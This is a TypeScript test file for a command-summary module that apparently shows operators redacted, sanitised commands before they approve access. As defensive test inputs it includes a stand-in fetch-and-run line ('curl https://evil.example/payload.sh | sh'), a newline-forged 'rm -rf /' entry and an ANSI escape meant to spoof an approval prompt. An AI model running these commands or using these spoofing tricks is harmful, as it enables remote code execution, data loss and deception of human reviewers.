import { describe, expect, test } from "bun:test";
import {
  describeCommand,
  encodeCommandHeader,
  MAX_ARG_DISPLAY_CHARS,
  MAX_COMMAND_ARGS,
  MAX_COMMAND_HEADER_BYTES,
  MAX_TOTAL_DISPLAY_CHARS,
  parseCommandHeader,
  summarizeCommand,
} from "../../gate/summarize-command.ts";

// ---------------------------------------------------------------------------
// summarizeCommand
// ---------------------------------------------------------------------------

describe("summarizeCommand", () => {
  test("returns undefined for empty command array", () => {
    expect(summarizeCommand([])).toBeUndefined();
  });

  test("returns binary name for single-element command", () => {
    expect(summarizeCommand(["gcloud"])).toBe("gcloud");
  });

  test("extracts basename from full path", () => {
    expect(summarizeCommand(["/usr/bin/gcloud"])).toBe("gcloud");
  });

  test("includes arguments in output", () => {
    expect(summarizeCommand(["gcloud", "compute", "instances", "list"])).toBe(
      "gcloud compute instances list",
    );
  });

  test("truncates commands longer than 80 characters", () => {
    const longArgs = Array.from({ length: 20 }, (_, i) => `arg-with-content-${i}`);
    const result = summarizeCommand(["mybinary", ...longArgs]);

    expect(result).toBeDefined();
    expect(result!.length).toBeLessThanOrEqual(80);
    expect(result!.endsWith("\u2026")).toBe(true);
    expect(result!.startsWith("mybinary")).toBe(true);
  });

  test("redacts long base64-like values (tokens/keys)", () => {
    const token = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop";
    const result = summarizeCommand(["gcloud", "--token", token]);

    expect(result).toBeDefined();
    expect(result).toContain("***");
    expect(result).not.toContain(token);
  });

  test("redacts key=value pairs with sensitive key names", () => {
    const result = summarizeCommand(["curl", "--password=s3cret-value"]);

    expect(result).toBeDefined();
    expect(result).toContain("--password=***");
    expect(result).not.toContain("s3cret-value");
  });

  test("redacts api-key values", () => {
    const result = summarizeCommand(["curl", "--api-key=my-secret-key"]);

    expect(result).toBeDefined();
    expect(result).toContain("--api-key=***");
    expect(result).not.toContain("my-secret-key");
  });

  test("redacts credential values", () => {
    const result = summarizeCommand(["tool", "--credential=some-cred"]);

    expect(result).toBeDefined();
    expect(result).toContain("--credential=***");
    expect(result).not.toContain("some-cred");
  });

  test("does not redact normal arguments", () => {
    const result = summarizeCommand(["gcloud", "compute", "--project=my-project"]);

    expect(result).toBe("gcloud compute --project=my-project");
  });

  test("does not redact short values", () => {
    const result = summarizeCommand(["gcloud", "compute", "us-central1-a"]);

    expect(result).toBe("gcloud compute us-central1-a");
  });

  test("handles path binary with arguments", () => {
    const result = summarizeCommand(["/opt/tools/bin/terraform", "apply", "-auto-approve"]);

    expect(result).toBe("terraform apply -auto-approve");
  });

  test("strips control characters from arguments", () => {
    const result = summarizeCommand(["gcloud", "compute\ninstances", "list"]);

    expect(result).toBeDefined();
    expect(result).not.toContain("\n");
    expect(result).toBe("gcloud compute instances list");
  });

  test("strips control characters from binary name", () => {
    const result = summarizeCommand(["my\tbin"]);

    expect(result).toBeDefined();
    expect(result).not.toContain("\t");
    expect(result).toBe("my bin");
  });

  test("strips null bytes and other control chars", () => {
    const result = summarizeCommand(["gcloud", "arg\x00with\x1fnulls"]);

    expect(result).toBeDefined();
    expect(result).not.toContain("\x00");
    expect(result).not.toContain("\x1f");
    expect(result).toBe("gcloud arg with nulls");
  });

  test("redacts secret key with mixed case", () => {
    const result = summarizeCommand(["tool", "--API_KEY=my-secret"]);

    expect(result).toBeDefined();
    expect(result).toContain("--API_KEY=***");
    expect(result).not.toContain("my-secret");
  });

  test("redacts secret key with empty value after equals", () => {
    const result = summarizeCommand(["tool", "--password="]);

    expect(result).toBeDefined();
    expect(result).toBe("tool --password=***");
  });

  test("redacts colon-separated secret values", () => {
    const result = summarizeCommand(["tool", "--password:hunter2secret"]);

    expect(result).toBeDefined();
    expect(result).toBe("tool --password:***");
    expect(result).not.toContain("hunter2secret");
  });

  test("redacts colon-separated token values", () => {
    const result = summarizeCommand(["tool", "token:abcdef"]);

    expect(result).toBeDefined();
    expect(result).toBe("tool token:***");
    expect(result).not.toContain("abcdef");
  });

  test("redacts a separate value following a sensitive option", () => {
    const result = summarizeCommand(["tool", "--password", "short!", "--project", "prod"]);

    expect(result).toBeDefined();
    expect(result).toBe("tool --password *** --project prod");
    expect(result).not.toContain("short!");
  });

  test("does not treat positional arguments after -- as sensitive options", () => {
    expect(summarizeCommand(["tool", "--", "--password", "visible-command-argument"])).toBe(
      "tool -- --password visible-command-argument",
    );
  });

  test("redacts JWT-shaped values containing dots", () => {
    const jwt = `${"a".repeat(20)}.${"b".repeat(24)}.${"c".repeat(32)}`;
    const result = summarizeCommand(["tool", jwt]);

    expect(result).toBe("tool ***");
    expect(result).not.toContain(jwt);
  });

  test("does not redact values just below the 40-char threshold", () => {
    const shortValue = "A".repeat(39);
    const result = summarizeCommand(["curl", shortValue]);

    expect(result).toBeDefined();
    expect(result).not.toContain("***");
    expect(result).toContain(shortValue);
  });

  test("redacts values exactly at the 40-char threshold", () => {
    const exactValue = "A".repeat(40);
    const result = summarizeCommand(["curl", exactValue]);

    expect(result).toBeDefined();
    expect(result).toContain("***");
    expect(result).not.toContain(exactValue);
  });
});

// ---------------------------------------------------------------------------
// parseCommandHeader
// ---------------------------------------------------------------------------

describe("parseCommandHeader", () => {
  test("returns undefined for null header", () => {
    expect(parseCommandHeader(null)).toBeUndefined();
  });

  test("returns undefined for empty string", () => {
    expect(parseCommandHeader("")).toBeUndefined();
  });

  test("returns undefined for invalid JSON", () => {
    expect(parseCommandHeader("not json")).toBeUndefined();
  });

  test("returns undefined for non-array JSON", () => {
    expect(parseCommandHeader('{"cmd":"gcloud"}')).toBeUndefined();
  });

  test("returns undefined for empty array", () => {
    expect(parseCommandHeader("[]")).toBeUndefined();
  });

  test("returns undefined for array with non-string elements", () => {
    expect(parseCommandHeader("[1, 2, 3]")).toBeUndefined();
  });

  test("parses valid command array", () => {
    const header = JSON.stringify(["gcloud", "compute", "instances", "list"]);
    expect(parseCommandHeader(header)).toEqual(["gcloud", "compute", "instances", "list"]);
  });

  test("parses single-element command", () => {
    const header = JSON.stringify(["bash"]);
    expect(parseCommandHeader(header)).toEqual(["bash"]);
  });
});

// ---------------------------------------------------------------------------
// describeCommand
//
// The contract that matters here: an operator reading the output either sees
// the whole command, or sees a line telling them what was withheld. There is
// no third case where content silently disappears.
// ---------------------------------------------------------------------------

describe("describeCommand", () => {
  test("returns undefined for empty command array", () => {
    expect(describeCommand([])).toBeUndefined();
  });

  test("reduces argv[0] to its basename", () => {
    const result = describeCommand(["/usr/local/bin/gcloud", "auth", "list"])!;
    expect(result.argv).toEqual(["gcloud", "auth", "list"]);
    expect(result.lines[0]).toContain("gcloud");
    expect(result.lines[0]).not.toContain("/usr/local/bin");
  });

  test("numbers one line per argument", () => {
    const result = describeCommand(["gcloud", "compute", "ssh"])!;
    expect(result.lines).toEqual(["  1  gcloud", "  2  compute", "  3  ssh"]);
    expect(result.totalArgs).toBe(3);
    expect(result.capped).toBe(false);
  });

  test("right-aligns numbers so columns stay readable past nine arguments", () => {
    const result = describeCommand(Array.from({ length: 12 }, (_, i) => `arg${i}`))!;
    expect(result.lines[0]).toBe("   1  arg0");
    expect(result.lines[11]).toBe("  12  arg11");
  });

  test("keeps arguments the 80-character summary drops", () => {
    const payload = "--command=curl https://evil.example/payload.sh | sh";
    const argv = [
      "/usr/bin/gcloud",
      "compute",
      "ssh",
      "bastion-01",
      "--zone=us-central1-a",
      "--project=some-fairly-long-project-name",
      payload,
    ];
    const result = describeCommand(argv)!;

    // This is the bug: the summary hides the payload behind an ellipsis...
    expect(result.summary).toHaveLength(80);
    expect(result.summary).not.toContain(payload);
    // ...but the full description carries it, unabridged.
    expect(result.argv).toContain(payload);
    expect(result.lines.join("\n")).toContain(payload);
    expect(result.capped).toBe(false);
  });

  test("applies the same redaction as the summary, per argument", () => {
    const token = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop";
    const result = describeCommand(["curl", "-H", token, "--password=hunter2"])!;

    expect(result.argv).toEqual(["curl", "-H", "***", "--password=***"]);
    expect(result.lines.join("\n")).not.toContain(token);
    expect(result.lines.join("\n")).not.toContain("hunter2");
  });

  test("redacts separate sensitive option values in the full description", () => {
    const result = describeCommand([
      "tool",
      "--client-secret",
      "punctuation.secret!",
      "--project",
      "prod",
    ])!;

    expect(result.argv).toEqual(["tool", "--client-secret", "***", "--project", "prod"]);
    expect(result.lines.join("\n")).not.toContain("punctuation.secret!");
  });

  test("strips control characters per element so a newline cannot forge a line", () => {
    const result = describeCommand(["gcloud", "safe\n  9  rm -rf /"])!;

    expect(result.lines).toHaveLength(2);
    expect(result.argv[1]).not.toContain("\n");
    expect(result.lines.join("\n")).not.toContain("\n  9  rm -rf /");
  });

  test("strips ANSI escapes that could redraw the operator's terminal", () => {
    const result = describeCommand(["gcloud", "[2J[HAllow?"])!;
    expect(result.argv.join("")).not.toContain("");
  });

  test("states how many characters it withheld from an oversized argument", () => {
    // Trailing "." keeps this out of the base64-ish secret pattern, which
    // would otherwise redact the whole argument before any cap applies.
    const huge = "x".repeat(MAX_ARG_DISPLAY_CHARS + 499) + ".";
    const result = describeCommand(["gcloud", huge])!;

    expect(result.capped).toBe(true);
    expect(result.argv[1]).toContain("…(+500 chars)");
    expect(result.argv[1]!.startsWith("x".repeat(MAX_ARG_DISPLAY_CHARS))).toBe(true);
  });

  test("states how many arguments it withheld past the argument limit", () => {
    const argv = Array.from({ length: MAX_COMMAND_ARGS + 37 }, (_, i) => `arg${i}`);
    const result = describeCommand(argv)!;

    expect(result.capped).toBe(true);
    expect(result.argv).toHaveLength(MAX_COMMAND_ARGS);
    expect(result.totalArgs).toBe(MAX_COMMAND_ARGS + 37);
    expect(result.lines.at(-1)).toContain("37 further argument(s) not shown");
    expect(result.lines.at(-1)).toContain(`argument limit ${MAX_COMMAND_ARGS}`);
  });

  test("states how many arguments it withheld past the total display limit", () => {
    // Each argument is large enough that the total budget runs out first.
    const chunk = "y".repeat(MAX_ARG_DISPLAY_CHARS - 1) + ".";
    const count = Math.ceil(MAX_TOTAL_DISPLAY_CHARS / MAX_ARG_DISPLAY_CHARS) + 5;
    const result = describeCommand(["gcloud", ...Array.from({ length: count }, () => chunk)])!;

    expect(result.capped).toBe(true);
    expect(result.argv.length).toBeLessThan(count + 1);
    expect(result.lines.at(-1)).toContain("further argument(s) not shown");
    expect(result.lines.at(-1)).toContain("display limit");
    // The notice must account for every argument the caller sent.
    expect(result.lines.at(-1)).toContain(`${count + 1 - result.argv.length} further`);
  });

  test("never reports a cap when nothing was withheld", () => {
    const result = describeCommand(["gcloud", "compute", "instances", "list"])!;
    expect(result.capped).toBe(false);
    expect(result.lines.join("\n")).not.toContain("not shown");
    expect(result.lines.join("\n")).not.toContain("…");
  });
});

// ---------------------------------------------------------------------------
// encodeCommandHeader
//
// Past a certain size an HTTP client stops sending a header rather than
// erroring, which would hand the operator an unlabelled "grant prod access?"
// dialog. Bounding the header here keeps that from ever happening, and says
// what it dropped when it does bound it.
// ---------------------------------------------------------------------------

describe("encodeCommandHeader", () => {
  const byteLength = (s: string) => new TextEncoder().encode(s).length;

  test("returns undefined for an empty command", () => {
    expect(encodeCommandHeader([])).toBeUndefined();
  });

  test("passes an ordinary command through unchanged", () => {
    const argv = ["gcloud", "compute", "instances", "list"];
    expect(encodeCommandHeader(argv)).toBe(JSON.stringify(argv));
  });

  test("keeps an oversized command under the byte budget", () => {
    const argv = ["gcloud", ...Array.from({ length: 5000 }, (_, i) => `--flag-number-${i}`)];
    const encoded = encodeCommandHeader(argv)!;

    expect(byteLength(encoded)).toBeLessThanOrEqual(MAX_COMMAND_HEADER_BYTES);
    expect(byteLength(JSON.stringify(argv))).toBeGreaterThan(MAX_COMMAND_HEADER_BYTES);
  });

  test("says how many arguments it dropped, rather than dropping them silently", () => {
    const argv = ["gcloud", ...Array.from({ length: 5000 }, (_, i) => `--flag-number-${i}`)];
    const parsed = parseCommandHeader(encodeCommandHeader(argv)!)!;
    const marker = parsed.at(-1)!;

    expect(marker).toContain("further argument(s) omitted by the client");
    expect(marker).toContain(String(argv.length - (parsed.length - 1)));
    // The marker survives into what the operator actually reads.
    expect(describeCommand(parsed)!.lines.join("\n")).toContain("omitted by the client");
  });

  test("still identifies the binary when a single argument exceeds the budget", () => {
    const huge = "z".repeat(MAX_COMMAND_HEADER_BYTES * 3) + ".";
    const parsed = parseCommandHeader(encodeCommandHeader(["/usr/bin/gcloud", huge])!)!;

    expect(parsed[0]).toContain("gcloud");
    expect(parsed.at(-1)).toContain("omitted by the client");
  });

  test("states when an oversized argv[0] itself was truncated", () => {
    const hugeBinary = `tool-${"z".repeat(MAX_COMMAND_HEADER_BYTES * 2)}`;
    const parsed = parseCommandHeader(encodeCommandHeader([hugeBinary])!)!;

    expect(parsed).toHaveLength(1);
    expect(parsed[0]).toContain("chars omitted by the client from argv[0]");
    expect(parsed[0]).not.toContain("0 further argument");
  });

  test("produces a header the gate can always parse back", () => {
    const argv = ["gcloud", ...Array.from({ length: 5000 }, (_, i) => `--flag-number-${i}`)];
    expect(parseCommandHeader(encodeCommandHeader(argv)!)).toBeDefined();
  });
});
